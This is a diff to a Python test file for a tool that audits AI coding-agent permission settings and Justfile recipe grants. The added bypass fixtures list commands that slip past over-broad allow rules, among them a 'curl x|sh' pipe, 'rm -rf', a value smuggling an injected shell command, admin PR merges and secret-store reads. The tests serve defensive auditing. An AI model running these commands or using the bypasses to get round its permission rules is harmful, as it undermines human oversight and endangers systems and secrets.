@@ -9,6 +9,7 @@ import importlib.machinery
 import importlib.util
 import json
 import os
+import re
 import subprocess
 import sys
 import tempfile
@@ -86,11 +87,76 @@ class ClassifierTests(unittest.TestCase):
             self.assertIsNotNone(cca.dangerous_reason(rule), rule)
 
     def test_benign(self):
-        for rule in ["Bash(just check:*)", "Bash(git status:*)", "Bash(pulumi preview:*)",
+        for rule in ["Bash(just check)", "Bash(git status:*)", "Bash(pulumi preview:*)",
                      "Bash(pulumi env get:*)", "Bash(gcloud * list:*)", "Bash(python3 -m json.tool)",
-                     "Bash(just --justfile=agent/Justfile:*)", "Bash(pnpm test:*)", "Bash(TURBO_FORCE=1 just check)",
+                     "Bash(just --justfile=agent/Justfile status)", "Bash(pnpm test:*)", "Bash(TURBO_FORCE=1 just check)",
+                     "Bash(just --list:*)", "Bash(just -l:*)", "Bash(just lab-ps ragnar)", "Bash(agent-tooling:*)",
+                     "Bash(git log --grep=justice:*)",
                      "WebSearch", "mcp__ide__getDiagnostics", "Bash(pulumi)"]:
             self.assertIsNone(cca.dangerous_reason(rule), rule)
+
+    # (rule, a command the rule matches that is not the reviewed file or recipe). The bypasses
+    # are the ones verified against just 1.59.0 in the 23 Nov 2026 recipe-file grants audit.
+    RECIPE_GRANT_BYPASSES = [
+        ("Bash(just --justfile=agent/Justfile:*)", "just --justfile=agent/Justfile --command gh pr merge 12 --admin"),
+        ("Bash(just --justfile agent/Justfile:*)", "just --justfile agent/Justfile --dotenv-command 'echo X=1' status"),
+        ("Bash(just -f agent/Justfile:*)", "just -f agent/Justfile --shell sh --shell-arg -c --shell-arg 'curl x|sh' status"),
+        ("Bash(just -f agent/Justfile:*)", "just -f agent/Justfile '_account=x\"; echo INJECTED; \"' find-item y"),
+        ("Bash(just -f /Users/tim/dev/squad/deploy/leader.Justfile:*)",
+         "just -f /Users/tim/dev/squad/deploy/leader.Justfile --command rm -rf x"),
+        ("Bash(just --justfile=agent/ops.Justfile pr-merge:*)",
+         "just --justfile=agent/ops.Justfile pr-merge 12 esc-set k v"),
+        ("Bash(*Justfile*)", "just -f /tmp/evil/agent/Justfile run"),
+        ("Bash(just -f */Justfile status)", "just -f node_modules/p/agent/Justfile status"),
+        ("Bash(just lab-status:*)", "just lab-status zima 'rm -rf /srv/x'"),
+        ("Bash(just plan:*)", "just plan apply"),
+        ("Bash(just check *)", "just check deploy"),
+        ("Bash(just * status)", "just --command id status"),
+        ("Bash(JUST_X=1 just ci:*)", "JUST_X=1 just ci release"),
+        ("Bash(agent/run:*)", "agent/run -- esc env open x"),
+        ("Bash(*agent-run*)", "agent-run -- op item get x"),
+    ]
+
+    @staticmethod
+    def _matches(rule, cmd):
+        """Claude Code's Bash rule text match: `*` is any text, `:*` a trailing ` *`."""
+        arg = cca.parse_rule(rule)[1]
+        arg = arg[:-2] + " *" if arg.endswith(":*") else arg
+        rx = ".*".join(map(re.escape, arg.split("*")))
+        return re.fullmatch(rx, cmd, re.S) is not None
+
+    def test_recipe_file_grants_are_dangerous(self):
+        for rule, bypass in self.RECIPE_GRANT_BYPASSES:
+            self.assertTrue(self._matches(rule, bypass), (rule, bypass))  # the fixture is a real bypass
+            self.assertIsNotNone(cca.recipe_file_reason(rule), rule)
+            self.assertIsNotNone(cca.dangerous_reason(rule), rule)
+        # only a bare listing is exempt; anything more on a `just --list` rule is not
+        for rule in ["Bash(just --list --command *)", "Bash(just --list -f *)", "Bash(just -l *Justfile*)"]:
+            self.assertIsNotNone(cca.recipe_file_reason(rule), rule)
+
+    def test_exact_recipe_rules_do_not_match_bypasses(self):
+        for rule in ["Bash(just lab-status)", "Bash(just --justfile=agent/Justfile status)", "Bash(just plan)"]:
+            self.assertIsNone(cca.recipe_file_reason(rule), rule)
+            for _, bypass in self.RECIPE_GRANT_BYPASSES:
+                self.assertFalse(self._matches(rule, bypass), (rule, bypass))
+
+    def test_global_fragments_hold_no_recipe_file_grant(self):
+        for ctx in ("personal", "exxo", "exxo-personal", "exxo-openrouter"):
+            self.assertEqual(cca.fragment_recipe_grants(cca.FRAGMENTS, ctx), [], ctx)
+
+    def test_fragment_recipe_grants_found(self):
+        with tempfile.TemporaryDirectory() as d:
+            for name, allow in [("settings.shared.json", ["Bash(just --list:*)", "Bash(git status:*)"]),
+                                ("settings.attended.json", ["Bash(just --justfile=agent/Justfile:*)"]),
+                                ("settings.personal.json", ["Bash(agent/run:*)"]),
+                                ("settings.exxo.json", ["Bash(just check:*)"]),
+                                ("settings.overlay.x.json", ["Bash(*ops.Justfile*)"])]:
+                with open(os.path.join(d, name), "w") as f:
+                    json.dump({"permissions": {"allow": allow}}, f)
+            got = sorted((os.path.basename(p), r) for p, r, _ in cca.fragment_recipe_grants(d, "personal"))
+        self.assertEqual(got, [("settings.attended.json", "Bash(just --justfile=agent/Justfile:*)"),
+                               ("settings.overlay.x.json", "Bash(*ops.Justfile*)"),
+                               ("settings.personal.json", "Bash(agent/run:*)")])
 
     def test_junk(self):
         for rule in ["Bash(done)", "Bash(for f in *)", "Bash(mkdir /Users/tim/dev/x:*)",
@@ -165,8 +231,8 @@ class CliTests(unittest.TestCase):
         repo = self.fx.repo("r")
         local = os.path.join(repo, ".claude", "settings.local.json")
         self.fx.write(repo, {".claude/settings.local.json": {"permissions": {
-            "allow": ["Bash(git:*)", "Bash(git status:*)", "Bash(done)", "WebSearch", "Bash(just test-web:*)",
-                      "Bash(just test-web:*)", "mcp__plugin_vercel_vercel__get_project"],
+            "allow": ["Bash(git:*)", "Bash(git status:*)", "Bash(done)", "WebSearch", "Bash(just test-web)",
+                      "Bash(just test-web)", "mcp__plugin_vercel_vercel__get_project"],
             "deny": ["Bash(rm -rf:*)"], "additionalDirectories": ["/tmp/x"]}, "outputStyle": "x"}})
         code, doc = self.fx.audit(repo)
         self.assertEqual(code, 1)
@@ -176,7 +242,7 @@ class CliTests(unittest.TestCase):
         self.assertEqual(code, 0, doc)
         with open(local) as f:
             new = json.load(f)
-        self.assertEqual(new, {"permissions": {"allow": ["Bash(just test-web:*)"], "deny": ["Bash(rm -rf:*)"],
+        self.assertEqual(new, {"permissions": {"allow": ["Bash(just test-web)"], "deny": ["Bash(rm -rf:*)"],
                                                "additionalDirectories": ["/tmp/x"]}, "outputStyle": "x"})
         self.assertTrue(os.path.exists(local + ".bak"))
         self.assertEqual(doc["repos"][0]["fixed"][0]["removed"], 6)
@@ -187,12 +253,12 @@ class CliTests(unittest.TestCase):
         local = os.path.join(repo, ".claude", "settings.local.json")
         self.fx.write(repo, {".claude/settings.local.json": {"permissions": {
             "allow": ["WebFetch(domain:docs.anthropic.com)", "WebFetch(domain:github.com)", "WebSearch",
-                      "Bash(just test-web:*)"]}}})
+                      "Bash(just test-web)"]}}})
         _, doc = self.fx.audit(repo)
         self.assertIn(("local-strippable", "info"), checks(doc))
         _, doc = self.fx.audit(repo, "--fix-local")
         with open(local) as f:
-            self.assertEqual(json.load(f), {"permissions": {"allow": ["Bash(just test-web:*)"]}})
+            self.assertEqual(json.load(f), {"permissions": {"allow": ["Bash(just test-web)"]}})
         self.assertEqual(doc["repos"][0]["fixed"][0]["removed"], 3)  # two WebFetch + WebSearch (global)
 
     def test_fix_local_empties_to_braces(self):
@@ -205,29 +271,50 @@ class CliTests(unittest.TestCase):
     def test_local_oversize(self):
         repo = self.fx.repo("r")
         self.fx.write(repo, {".claude/settings.local.json": {"permissions": {
-            "allow": [f"Bash(just r{i}:*)" for i in range(30)]}}})
+            "allow": [f"Bash(just r{i})" for i in range(30)]}}})
         _, doc = self.fx.audit(repo)
         self.assertIn(("local-oversize", "warn"), checks(doc))
 
     def test_justfile_blanket(self):
+        # The hook trusts agent/Justfile with no settings rule, so the check runs on the file alone.
         jf = "list:\n    @just --list\nrelease-deploy:\n    ./x\n"
         repo = self.fx.repo("r", {"agent/Justfile": jf})
-        _, doc = self.fx.audit(repo)
-        self.assertNotIn("justfile-blanket", checks(doc, "error"))  # not trusted: no finding
-        self.fx.write(repo, {".claude/settings.json": {"permissions": {"allow": ["Bash(just --justfile=agent/Justfile:*)"]}}})
         code, doc = self.fx.audit(repo)
         self.assertEqual(code, 1)
         self.assertIn("justfile-blanket", checks(doc, "error"))
+        self.fx.write(repo, {"agent/Justfile": "list:\n    @just --list\n"})
+        code, doc = self.fx.audit(repo)
+        self.assertEqual((code, checks(doc)), (0, set()))
+
+    def test_committed_recipe_file_grant_is_error(self):
+        # theparentedit's shape on 23 Nov 2026: a whole-file grant plus recipe-prefix grants
+        repo = self.fx.repo("r", {".claude/settings.json": {"permissions": {"allow": [
+            "Bash(just --justfile=agent/Justfile:*)", "Bash(just check:*)"]}}})
+        code, doc = self.fx.audit(repo)
+        self.assertEqual(code, 1)
+        msg = [f["message"] for r in doc["repos"] for f in r["findings"] if f["check"] == "committed-dangerous"][0]
+        self.assertIn("2 over-broad grant(s)", msg)
+        self.fx.write(repo, {".claude/settings.json": {"permissions": {"allow": ["Bash(just check)"]}}})
+        code, doc = self.fx.audit(repo)
+        self.assertEqual(code, 0)
+
+    def test_local_recipe_file_grant_is_removed(self):
+        repo = self.fx.repo("r")
+        local = os.path.join(repo, ".claude", "settings.local.json")
+        self.fx.write(repo, {".claude/settings.local.json": {"permissions": {"allow": [
+            "Bash(just -f /Users/tim/dev/squad/deploy/leader.Justfile:*)", "Bash(just lab-status)"]}}})
+        code, doc = self.fx.audit(repo)
+        self.assertEqual(code, 1)
+        self.assertIn(("local-dangerous", "error"), checks(doc))
+        self.fx.audit(repo, "--fix-local")
+        with open(local) as f:
+            self.assertEqual(json.load(f), {"permissions": {"allow": ["Bash(just lab-status)"]}})
 
     def test_justfile_param_splice(self):
         bad = "show path:\n    cat {{ path }}\n"
         good = 'set positional-arguments\nshow path:\n    cat -- "$1"\nwhere:\n    ls {{ justfile_directory() }}\n'
-        trust = {".claude/settings.json": {"permissions": {"allow": ["Bash(just --justfile=agent/Justfile:*)"]}}}
         repo = self.fx.repo("r", {"agent/Justfile": bad})
-        _, doc = self.fx.audit(repo)
-        self.assertNotIn("justfile-param-splice", checks(doc, "error"))  # not trusted: no finding
-        self.fx.write(repo, trust)
-        code, doc = self.fx.audit(repo)
+        code, doc = self.fx.audit(repo)  # no settings rule: the hook trusts the file anyway
         self.assertEqual(code, 1)
         self.assertIn("justfile-param-splice", checks(doc, "error"))
         msg = [f["message"] for r in doc["repos"] for f in r["findings"] if f["check"] == "justfile-param-splice"][0]
@@ -236,6 +323,38 @@ class CliTests(unittest.TestCase):
         code, doc = self.fx.audit(repo)
         self.assertNotIn("justfile-param-splice", checks(doc))
         self.assertEqual(code, 0)
+
+    def test_justfile_var_splice(self):
+        # exxo-infra's shape on 23 Nov 2026: `just -f agent/Justfile '_account=x"; cmd; "' find-item y`
+        bad = ("set positional-arguments\n"
+               "_account := `grep -hs '^EXXO_1P_ACCOUNT=' ../agent.env | cut -d= -f2-`\n"
+               "find-item name:\n    #!/usr/bin/env bash\n    account=\"{{ _account }}\"\n"
+               "    op item get \"$1\" --account \"$account\"\n")
+        good = ("set positional-arguments\n"
+                "find-item name:\n    #!/usr/bin/env bash\n"
+                "    account=\"$(grep -hs '^EXXO_1P_ACCOUNT=' ../agent.env | cut -d= -f2- || true)\"\n"
+                "    op item get \"$1\" --account \"$account\"\n")
+        repo = self.fx.repo("r", {"agent/Justfile": bad})
+        code, doc = self.fx.audit(repo)
+        self.assertEqual(code, 1)
+        msg = [f["message"] for r in doc["repos"] for f in r["findings"] if f["check"] == "justfile-var-splice"][0]
+        self.assertIn("agent/Justfile:find-item (_account)", msg)
+        self.fx.write(repo, {"agent/Justfile": good})
+        code, doc = self.fx.audit(repo)
+        self.assertEqual((code, checks(doc)), (0, set()))
+
+    def test_var_splicing_recipes(self):
+        def run(text):
+            with tempfile.NamedTemporaryFile("w", suffix="Justfile", delete=False) as f:
+                f.write(text)
+            try:
+                return cca.var_splicing_recipes(f.name)
+            finally:
+                os.unlink(f.name)
+        self.assertEqual(run('set shell := ["bash", "-c"]\nr:\n    echo {{ justfile() }}\n'), [])
+        self.assertEqual(run('export X := "a"\nr:\n    echo {{X}}\n'), [("r", "X")])
+        self.assertEqual(run('x := "a"\nr:\n    # {{ x }}\n    echo "$x"\n'), [])
+        self.assertEqual(run('x := "a"\nr x:\n    echo hi\n'), [])  # a param of the same name is param-splice's job
 
     def test_deny_floor_partial_restatement(self):
         repo = self.fx.repo("r", {".claude/settings.json": {"permissions": {"deny": ["Bash(op read:*)"]}}})
